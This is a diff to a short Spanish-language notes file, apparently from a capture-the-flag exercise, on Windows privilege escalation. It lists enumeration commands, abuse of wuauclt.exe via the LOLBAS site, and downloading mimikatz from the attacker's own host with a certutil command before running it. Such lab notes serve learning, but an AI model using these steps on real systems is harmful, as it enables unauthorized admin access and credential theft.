@@ -1,9 +1,23 @@
 Root.txt
-Mirar si hay credenciales guardadas en el Credential Manager
+
+Una vez nos conectamos con de forma remota, abrimos una powershell y empezamos con la enumeracion y busqueda de alguna vulnerabilidad que nos permita realizar la escalada de privilegios.
+
+Miramos nuestros prvilegios:
+    - whoami /all
+    - net user username
+
+Vemos que estamos dentro de un grupo diferente alo normal, vemos si nos da algo de infromacion su descripcion:
+    net localgroup group_name 
+
+En la descripcion pone que podemos ejecutar el binario wuauclt.exe con privilegios administrador de la siguiente forma:
+C:\Users\Administrator\Desktop\script.exe -ArgumentList 'Args'
+
+Visitamos la pagina web lolbas: https://lolbas-project.github.io/# y buscamos el binario.
+Y nos pone lo que tenemos que hacer para realizar la escalada.
 
 Descargar mimikatz.exe:
     - python3 - hhtp.server
-    - En el edge, descargar, poniendo nuestra IP
+    - certutil -f -urlcache -split http://IP:PORT/mimikatz.exe
 
 Ejecutar mimikatz.exe:
     - log
